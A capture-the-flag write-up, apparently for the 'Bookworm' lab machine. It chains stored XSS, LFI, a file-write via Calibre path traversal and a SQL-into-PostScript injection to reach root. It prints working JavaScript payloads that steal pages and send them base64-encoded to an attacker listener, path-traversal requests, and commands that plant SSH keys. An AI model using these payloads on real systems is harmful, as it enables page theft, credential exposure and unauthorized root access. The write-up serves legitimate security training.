# Bookworm

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.90.108
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 10:13 EDT
Nmap scan report for 10.129.90.108
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Just two ports open. We have to add `bookworm.htb` to our `/etc/hosts` file to access the website.&#x20;

### Bookworm --> Find XSS

Port 80 was an online bookstore site with books for sale:

<figure><img src="../../.gitbook/assets/image (876).png" alt=""><figcaption></figcaption></figure>

We can view the shop to find some books on sale:

<figure><img src="../../.gitbook/assets/image (1065).png" alt=""><figcaption></figcaption></figure>

Proxying the traffic through Burpsuite reveals that this is an Express based website:

<figure><img src="../../.gitbook/assets/image (1733).png" alt=""><figcaption></figcaption></figure>

The website allows us to create a user, and afterwards we can access the cart and checkout functions. Immediately after adding my book, we can see that the website updates to show that:

<figure><img src="../../.gitbook/assets/image (3897).png" alt=""><figcaption></figcaption></figure>

I looked through the traffic and refreshed the page. This time, the Updates included another user who was adding books to their basket:

<figure><img src="../../.gitbook/assets/image (2678).png" alt=""><figcaption></figcaption></figure>

So this is the first indication that **there was another user present on the site and interacting with the shop**. Within the checkout function, there was an Edit Note function available.

<figure><img src="../../.gitbook/assets/image (3062).png" alt=""><figcaption></figcaption></figure>

I took note of the 'download books' option since it was removed. There was mention of 'old orders still being downloadable', which might come in handy later. Since there was a user also accessing the site, I figured that XSS might be the exploit path here, so I entered a basic payload:

```markup
<img src="http://10.10.14.34/?callback">
```

After updating the note and completing the checkout, I received a callback on our HTTP server.

<figure><img src="../../.gitbook/assets/image (4030).png" alt=""><figcaption></figcaption></figure>

So XSS was possible, but right now it's only viewable by us and we need to somehow figure out how to inject this into the cart of others. I took a look at the POST request made, and found that a number was used as the cart identifier:

<figure><img src="../../.gitbook/assets/image (2543).png" alt=""><figcaption></figcaption></figure>

On a side note, I noticed that there were different usernames for the bot each time I refreshed the page:

<figure><img src="../../.gitbook/assets/image (3855).png" alt=""><figcaption></figcaption></figure>

Examining the page source reveals that there was some number associated with the updates:

<figure><img src="../../.gitbook/assets/image (2246).png" alt=""><figcaption></figcaption></figure>

This number incremented itself each time, and it was likely that this is the same number used for the cart ID, giving us an opportunity to inject XSS payloads into the cart of the bot. Apart from the checkout, viewing the user profile reveals that we can upload an avatar to the site:

<figure><img src="../../.gitbook/assets/image (2686).png" alt=""><figcaption></figcaption></figure>

We can try uploading some basic Javascript files (since this was likely an XSS-based initial access). After some trial and error, I found that by changing the `Content-Type` header to `image/jpeg`, we can bypass the content check and upload whatever we want.&#x20;

<figure><img src="../../.gitbook/assets/image (968).png" alt=""><figcaption></figcaption></figure>

### Profile XSS --> Steal Page

After that initial recon, we can try to inject payloads into the notes of the bot's cart.

```http
POST /basket/2061/edit HTTP/1.1
Host: bookworm.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
Origin: http://bookworm.htb
Connection: close
Referer: http://bookworm.htb/basket
Cookie: session=eyJmbGFzaE1lc3NhZ2UiOnt9LCJ1c2VyIjp7ImlkIjoxNCwibmFtZSI6InRlc3QiLCJhdmF0YXIiOiIvc3RhdGljL2ltZy91c2VyLnBuZyJ9fQ==; session.sig=eNrnjBHPf1vWoX6kzmk2xB4dWdM
Upgrade-Insecure-Requests: 1

quantity=1&note=%3Cimg+src%3D%22http%3A%2F%2F10.10.14.34%2F%3Fbotcallback%22%3E
```

This payload works in getting a callback from the machine itself.&#x20;

<figure><img src="../../.gitbook/assets/image (931).png" alt=""><figcaption></figcaption></figure>

Interestingly, when we send the above request, we would get a `base64` encoded cookie which indicates that our avatar is loaded, which might be our XSS point:

<figure><img src="../../.gitbook/assets/image (2688).png" alt=""><figcaption></figcaption></figure>

We can test this first by updating our profile picture with the following request:

```http
POST /profile/avatar HTTP/1.1
Host: bookworm.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------7893868742127952433304288570
Content-Length: 262
Origin: http://bookworm.htb
Connection: close
Referer: http://bookworm.htb/profile
Cookie: session=eyJmbGFzaE1lc3NhZ2UiOnt9LCJ1c2VyIjp7ImlkIjoxNCwibmFtZSI6InRlc3QiLCJhdmF0YXIiOiIvc3RhdGljL2ltZy91c2VyLnBuZyJ9fQ==; session.sig=eNrnjBHPf1vWoX6kzmk2xB4dWdM
Upgrade-Insecure-Requests: 1

-----------------------------7893868742127952433304288570
Content-Disposition: form-data; name="avatar"; filename="test.jpg"
Content-Type: image/jpeg

fetch("http://10.10.14.34/?profilebotcallback")
-----------------------------7893868742127952433304288570--
```

When we refresh our `/profile` page, we can see that our image is located at a certain static directory:

<figure><img src="../../.gitbook/assets/image (2220).png" alt=""><figcaption></figcaption></figure>

After waiting for a bit, we would eventually get a callback using this method:

<figure><img src="../../.gitbook/assets/image (3540).png" alt=""><figcaption></figcaption></figure>

There was mention of 'old orders' being used, so I wanted to see if we could steal page contents via XSS. The stealing of cookies won't work in this case since the `Set-Cookie` header had the `httponly` value, so stealing pages is the only other method.

To do this, we can create a Flask server to redirect the bot to other pages. The `/profile` endpoint had an Order History record at the bottom:

<figure><img src="../../.gitbook/assets/image (562).png" alt=""><figcaption></figcaption></figure>

So the exploit path is to redirect the bot to their own `/profile` directory and view their old orders via injecting Javascript code into our profile picture.

I tried it with this payload:

```javascript
var url = "http://10.129.90.108/profile";
var attacker = "http://10.10.14.34:8000/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.send(null);
```

The above payload doesn't work, but we can at least confirm that page stealing is the way to go:

<figure><img src="../../.gitbook/assets/image (1963).png" alt=""><figcaption></figcaption></figure>

I took a break from this machine while waiting for it to be hosted on the SG VPN for stability (so that's why the IP addresses are different later). Afterwards, I edited the Javascript code a bit to wait for the page to load before sending me the contents:

```javascript
function stealpage(url) {
    var attacker = "http://10.10.14.13/?url=" + encodeURIComponent(url);
    fetch(url).then(async res => {
        fetch(attacker + "&data=" + btoa(await res.text()))
    });
}
stealpage("http://bookworm.htb/profile")
```

Afterwards, I would get a callback with a huge base64 encoded string at the back:

<figure><img src="../../.gitbook/assets/image (1795).png" alt=""><figcaption></figcaption></figure>

Here's the interseting part of the page decoded:

```markup
<hr>
<h3>Order History</h3>
<table class="table">
  <thead>
    <tr>
      <th scope="col">#</th>
      <th scope="col">Ordered At</th>
      <th scope="col">Total Price</th>
      <th scope="col"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">Order #16</th>
      <td>Wed Jan 18 2023 20:10:04 GMT+0000 (Coordinated Universal Time)</td>
      <td>£33</td>
      <td>
        <a href="/order/16">View Order</
      </td>
    </tr>
    <tr>
      <th scope="row">Order #17</th>
      <td>Sat Jan 21 2023 20:10:04 GMT+0000 (Coordinated Universal Time)</td>
      <td>£39</td>
      <td>
        <a href="/order/17">View Order</
      </td>
    </tr>
    <tr>
      <th scope="row">Order #18</th>
      <td>Fri Jan 27 2023 20:10:04 GMT+0000 (Coordinated Universal Time)</td>
      <td>£66</td>
      <td>
        <a href="/order/18">View Order</
      </td>
    </tr>
  </tbody>
</table>
  </div>
  </body>
</html>
```

The first thing we notice is that there are indeed older orders present on the site. We can attempt to view one of the orders, and I chose to steal `/order/18`. However, it seems that the order number changes each time because the bot uses a different user each time.

Instead, we can add to our Javascript payload by scraping the possible endpoints from the page, visiting them and sending the page contents back to our webserver:

```javascript
function getOrder(html_page) {
    const parser = new DOMParser();
    const htmlString = html_page;
    const doc = parser.parseFromString(htmlString, 'text/html');
    const orderLink = doc.querySelector('tbody a');
    const orderUrl = orderLink ? orderLink.getAttribute('href') : null; 
    return orderUrl ? ["http://bookworm.htb" + orderUrl] : []; 
}
function stealpage(url) {
    var attacker = "http://10.10.14.13/?url=" + encodeURIComponent(url);
    fetch(url).then(async res => {
        fetch(attacker + "&data=" + btoa(await res.text()))
    });
}
fetch("http://bookworm.htb/profile").then(async (res) => {
    const html = await res.text();
    const orders = getOrder(html);
    for (const path of orders) {
        const url = "http://bookworm.htb" + path;
        stealpage(url);
    }
});
```

After receiving our callback, we can decode the page to find this interesting part:

```markup
<td>
<a href="/download/13?bookIds=17" download="Hans Holbein.pdf">Download e-book</a>
</td>
```

Within each `/order` endpoint, there's the option to download the book. We can test for vulnerabilities like RCE and LFI in this.

### XSS LFI --> User Creds

I tested for LFI first, and this can be done by editing our Javascript code to visit the `/order` page and then visit `/download/<NUMBER>?bookIds=../../../../../../etc/passwd`. We would also need to have a handler that would convert it to a PDF file somehow.

```javascript
function getOrder(html_page) {
    const doc = new DOMParser().parseFromString(html_page, 'text/html');
    return Array.from(doc.querySelectorAll('tbody a'), link => "http://bookworm.htb" + link.getAttribute('href'));
}

function getDownload(html) {
    const downloadLink = (new DOMParser().parseFromString(html, 'text/html')).querySelector('a[href^="/download"]');
    return downloadLink ? downloadLink.href.replace(/=(.+)$/, "=.&bookIds=../../../../../../etc/passwd") : null;
}

function arrayBufferToBase64(buffer) {
    return btoa(String.fromCharCode(...new Uint8Array(buffer)));
}

function sendRequest(url) {
    const attacker = "http://10.10.14.13>/?url=" + encodeURIComponent(url);
    fetch(url).then(async res => {
        fetch(attacker + "&data=" + arrayBufferToBase64(await res.arrayBuffer()));
    });
}

async function getPdf(url) {
    const html = await (await fetch(url)).text();
    const download = getDownload(html);
    if (download) {
        sendRequest(download);
    }
}

fetch("http://bookworm.htb/profile")
    .then(res => res.text())
    .then(html => {
        const orders = getOrder(html);
        for (const path of orders) {
            getPdf(path);
        }
    });
```

This would give us a huge base64 string, which can be decoded into a `.zip` file and unzipped to find the contents of `/etc/passwd`.

<figure><img src="../../.gitbook/assets/image (1097).png" alt=""><figcaption></figcaption></figure>

This confirms that we have LFI on the machine, and we can proceed to enumerate `/proc/self/cmdline` to view the active processes on the machine (since we don't have anything else to read):

```
$ cat cmdline
/usr/bin/nodeindex.js
```

We can then read the `/proc/self/cwd/index.js` to find the file being run:

```javascript
const express = require("express");
const nunjucks = require("nunjucks");
const path = require("path");
const session = require("cookie-session");
const fileUpload = require("express-fileupload");
const archiver = require("archiver");
const fs = require("fs");
const { flash } = require("express-flash-message");
const { sequelize, User, Book, BasketEntry, Order, OrderLine } = require("./database");
const { hashPassword, verifyPassword } = require("./utils");
const { QueryTypes } = require("sequelize");
const { randomBytes } = require("node:crypto");
const timeAgo = require("timeago.js");

const app = express();
const port = 3000;
<TRUNCATED>
```

It seems that this requires a `database.js` file to be run. So, we can read `/proc/self/cwd/database.js` next, and within it we can find user credentials!

<figure><img src="../../.gitbook/assets/image (2152).png" alt=""><figcaption></figcaption></figure>

Then, we can `ssh` in using `frank` as the username.&#x20;

<figure><img src="../../.gitbook/assets/image (2815).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

`frank` does not have any `sudo` privileges, and there's another user `neil` present on the machine:

```
frank@bookworm:/home$ ll
total 16
drwxr-xr-x  4 root  root  4096 May  3 15:34 ./
drwxr-xr-x 20 root  root  4096 May  3 15:34 ../
drwxr-xr-x  5 frank frank 4096 May 24 12:20 frank/
drwxr-xr-x  6 neil  neil  4096 May  3 15:34 neil/
```

### Calibre --> File Write

I ran a `pspy64` scan to find out what processes are being run by `neil`. Within this, I found lots of Google Chrome related processes:

```bash
2023/06/01 10:32:52 CMD: UID=0    PID=4619   | /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=4591 --no-sandbox --disable-dev-shm-usage --disable-background-timer-throttling --disable-breakpad --enable-automation --force-color-profile=srgb --remote-debugging-port=0 --allow-pre-commit-input --ozone-platform=headless --disable-databases --disable-gpu-compositing --enable-blink-features=IdleDetection --lang=en-US --num-raster-threads=1 --renderer-client-id=4 --time-ticks-at-unix-epoch=-1685611397759220 --launch-time-ticks=4125178583 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,5767257916058271870,7795791730638178676,262144 --enable-features=Network               
2023/06/01 10:32:52 CMD: UID=0    PID=4618   | /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=4591 --first-renderer-process --no-sandbox --disable-dev-shm-usage --disable-background-timer-throttling --disable-breakpad --enable-automation --force-color-profile=srgb --remote-debugging-port=0 --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --enable-blink-features=IdleDetection --lang=en-US --num-raster-threads=1 --renderer-client-id=3 --time-ticks-at-unix-epoch=-1685611397759220 --launch-time-ticks=4125153876 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,5767257916058271870,7795791730638178676,262144 --enable-features=Ne
2023/06/01 10:32:52 CMD: UID=0    PID=4596   | /opt/google/chrome/chrome --type=zygote --no-sandbox --headless --headless --crashpad-handler-pid=4591 --enable-crash-reporter                                 
2023/06/01 10:32:52 CMD: UID=0    PID=4595   | /opt/google/chrome/chrome --type=zygote --no-zygote-sandbox --no-sandbox --headless --headless --crashpad-handler-pid=4591 --enable-crash-reporter             
2023/06/01 10:32:52 CMD: UID=0    PID=4591   | /opt/google/chrome/chrome_crashpad_handler --monitor-self-annotation=ptype=crashpad-handler --database=/tmp/Crashpad --url=https://clients2.google.com/cr/report --annotation=channel= --annotation=lsb-release=Ubuntu 20.04.6 LTS --annotation=plat=Linux --annotation=prod=Chrome_Headless --annotation=ver=113.0.5672.126 --initial-client-fd=5 --shared-client-connection
2023/06/01 10:34:53 CMD: UID=0    PID=4708   | /bin/bash /usr/bin/google-chrome --allow-pre-commit-input --disable-background-networking --disable-background-timer-throttling --disable-backgrounding-occluded-windows --disable-breakpad --disable-client-side-phishing-detection --disable-component-extensions-with-background-pages --disable-component-update --disable-default-apps --disable-dev-shm-usage --disable-extensions --disable-features=Translate,BackForwardCache,AcceptCHFrame,MediaRouter,OptimizationHints --disable-hang-monitor --disable-ipc-flooding-protection --disable-popup-blocking --disable-prompt-on-repost --disable-renderer-backgrounding --disable-sync --enable-automation --enable-blink-features=IdleDetection --enable-features=NetworkServiceInProcess2 --export-tagged-pdf --force-color-profile=srgb --metrics-recording-only --no-first-run --password-store=basic --use-mock-keychain --headless --hide-scrollbars --mute-audio about:blank --no-sandbox --disable-background-networking --disable-default-apps --disable-extensions --disable-gpu --disable-sync --disable-translate --hide-scrollbars --metrics-recording-only --mute-audio --no-first-run --safebrowsing-disable-auto-update --remote-debugging-port=0 --user-data-dir=/tmp/puppeteer_dev_chrome_profile-Zh8Dm3
```

Not too sure if this is intentional, but I do know there are Google Chrome exploits present. Anyway, within the user `neil` home directory, I found some interesting files:

```
frank@bookworm:/home/neil$ ls
converter
frank@bookworm:/home/neil$ cd converter/
frank@bookworm:/home/neil/converter$ ll
total 104
drwxr-xr-x  7 root root  4096 May  3 15:34 ./
drwxr-xr-x  6 neil neil  4096 May  3 15:34 ../
drwxr-xr-x  8 root root  4096 May  3 15:34 calibre/
-rwxr-xr-x  1 root root  1658 Feb  1 09:13 index.js*
drwxr-xr-x 96 root root  4096 May  3 15:34 node_modules/
drwxrwxr-x  2 root neil  4096 May  3 15:34 output/
-rwxr-xr-x  1 root root   438 Jan 30 19:46 package.json*
-rwxr-xr-x  1 root root 68895 Jan 30 19:46 package-lock.json*
drwxrwxr-x  2 root neil  4096 May  3 15:34 processing/
drwxr-xr-x  2 root root  4096 May  3 15:34 templates/

frank@bookworm:/home/neil/converter/calibre$ ./calibre --version
calibre (calibre 6.11)
```

There was something called `calibre` present on the machine. Also, port 3001 was listening on the machine:

```
frank@bookworm:/home/neil/converter$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:36767         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           - 
```

We can forward this using `chisel` and view the site:

<figure><img src="../../.gitbook/assets/image (2803).png" alt=""><figcaption></figcaption></figure>

I found the documentation for this application here:

{% embed url="https://manual.calibre-ebook.com/generated/en/ebook-convert.html" %}

Here's the initial response intercepted in Burp:

<figure><img src="../../.gitbook/assets/image (259).png" alt=""><figcaption></figcaption></figure>

I played around with the `outputType` variable and tried LFI again, and it worked:

<figure><img src="../../.gitbook/assets/image (3743).png" alt=""><figcaption></figcaption></figure>

Within the machine, it creates this file with `neil` permissions:

<figure><img src="../../.gitbook/assets/image (2106).png" alt=""><figcaption></figcaption></figure>

This means we have an arbitrary file write as the `neil` user, and we can try to drop our SSH public key into his `authorized_keys` folder. I tried to directly write it to that folder but it doesn't work, and I think we have to maintain the `.txt` extension.

As such, we can create a symlink between `testkey.txt` and the `authorized_keys` folder using:

```
ln -s /home/neil/.ssh/authorized_keys key.txt
```

Afterwards, we can send this request to add our SSH key:

```http
POST /convert HTTP/1.1
Host: 127.0.0.1:3001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------292034445114065400543811074751
Content-Length: 791
Origin: http://127.0.0.1:3001
Connection: close
Referer: http://127.0.0.1:3001/
Cookie: session=eyJmbGFzaE1lc3NhZ2UiOnt9fQ==; session.sig=unIt4GDQSCUqkXd9r4WU_geYMnI
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

-----------------------------292034445114065400543811074751
Content-Disposition: form-data; name="convertFile"; filename="key.html"
Content-Type: application/vnd.ms-publisher

<KEY>
-----------------------------292034445114065400543811074751
Content-Disposition: form-data; name="outputType"

../../../../../../../tmp/testssh/key.txt
-----------------------------292034445114065400543811074751--
```

Then we can `ssh` in as `neil`.&#x20;

<figure><img src="../../.gitbook/assets/image (2926).png" alt=""><figcaption></figcaption></figure>

### SQL PostScript Injection

The `neil` user can run `genlabel` on the machine:

```
neil@bookworm:~$ sudo -l
Matching Defaults entries for neil on bookworm:                                                                  
    env_reset, mail_badpass,                                                                                     
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                     
                                                                                                                 
User neil may run the following commands on bookworm:                                                            
    (ALL) NOPASSWD: /usr/local/bin/genlabel
```

We can try to run the command and see how it takes an `orderId` parameter:

```
neil@bookworm:~$ sudo /usr/local/bin/genlabel
Usage: genlabel [orderId]
neil@bookworm:~$ sudo /usr/local/bin/genlabel 1
Fetching order...
Generating PostScript file...
Generating PDF (until the printer gets fixed...)
Documents available in /tmp/tmp6e6lsyfwprintgen
```

We can take a look at the executable, which happens to be a Python script:

```python
neil@bookworm:~$ cat /usr/local/bin/genlabel
#!/usr/bin/env python3

import mysql.connector
import sys
import tempfile
import os
import subprocess

with open("/usr/local/labelgeneration/dbcreds.txt", "r") as cred_file:
    db_password = cred_file.read().strip()

cnx = mysql.connector.connect(user='bookworm', password=db_password,
                              host='127.0.0.1',
                              database='bookworm')

if len(sys.argv) != 2:
    print("Usage: genlabel [orderId]")
    exit()

try:
    cursor = cnx.cursor()
    query = "SELECT name, addressLine1, addressLine2, town, postcode, Orders.id as orderId, Users.id as userId FROM Orders LEFT JOIN Users On Orders.userId = Users.id WHERE Orders.id = %s" % sys.argv[1]

    cursor.execute(query)

    temp_dir = tempfile.mkdtemp("printgen")
    postscript_output = os.path.join(temp_dir, "output.ps")
    # Temporary until our virtual printer gets fixed
    pdf_output = os.path.join(temp_dir, "output.pdf")

    with open("/usr/local/labelgeneration/template.ps", "r") as postscript_file:
        file_content = postscript_file.read()

    generated_ps = ""

    print("Fetching order...")
    for (name, address_line_1, address_line_2, town, postcode, order_id, user_id) in cursor:
        file_content = file_content.replace("NAME", name) \
                        .replace("ADDRESSLINE1", address_line_1) \
                        .replace("ADDRESSLINE2", address_line_2) \
                        .replace("TOWN", town) \
                        .replace("POSTCODE", postcode) \
                        .replace("ORDER_ID", str(order_id)) \
                        .replace("USER_ID", str(user_id))

    print("Generating PostScript file...")
    with open(postscript_output, "w") as postscript_file:
        postscript_file.write(file_content)

    print("Generating PDF (until the printer gets fixed...)")
    output = subprocess.check_output(["ps2pdf", "-dNOSAFER", "-sPAPERSIZE=a4", postscript_output, pdf_output])
    if output != b"":
        print("Failed to convert to PDF")
        print(output.decode())

    print("Documents available in", temp_dir)
    os.chmod(postscript_output, 0o644)
    os.chmod(pdf_output, 0o644)
    os.chmod(temp_dir, 0o755)
    # Currently waiting for third party to enable HTTP requests for our on-prem printer
    # response = requests.post("http://printer.bookworm-internal.htb", files={"file": open(postscript_output)})

except Exception as e:
    print("Something went wrong!")
    print(e)

cnx.close()
```

This uses the `postscript_file.write` to first write the file, and then it uses`ps2pdf` to convert it to a PDF. The parameter taken by the user is not sanitised, making this vulnerable to SQL PostScript Injection actually.&#x20;

We can find out more about writing PostScript here by Googling PostScript write files:

{% embed url="https://stackoverflow.com/questions/25702146/file-i-o-in-postscript" %}

The idea here is to somehow write some PostScript code to put our own SSH key into the `root` user's `authorized_keys` folder. The user input is the very last parameter in the SQL query, which we can invalidate using this:

```
"0 UNION SELECT ')
```

This would escape the query and then end it. Then, we can append our PostScript exploit to the back of that:

```
show\n/outfile1 (/root/.ssh/authorized_keys) (w) file def\noutfile1 (key) writestring\noutfile1 closefile\n\n
```

Afterwards, we have to set the rest of the SQL values to prevent errors from happening. The final command is:

{% code overflow="wrap" %}
```bash
sudo /usr/local/bin/genlabel "0 union select') show\n/outfile1
(/root/.ssh/authorized_keys) (w) file def\noutfile1 (KEY)
writestring\noutfile1 closefile\n(a' as name, '1' as addressLine1, '1' as
addressLine2, '1' as town, '1' as postcode, 0 as orderId, 1 as userId;"
```
{% endcode %}

Then, we can just `ssh` into `root` from our `kali` machine.

<figure><img src="../../.gitbook/assets/image (2293).png" alt=""><figcaption></figcaption></figure>

Rooted!
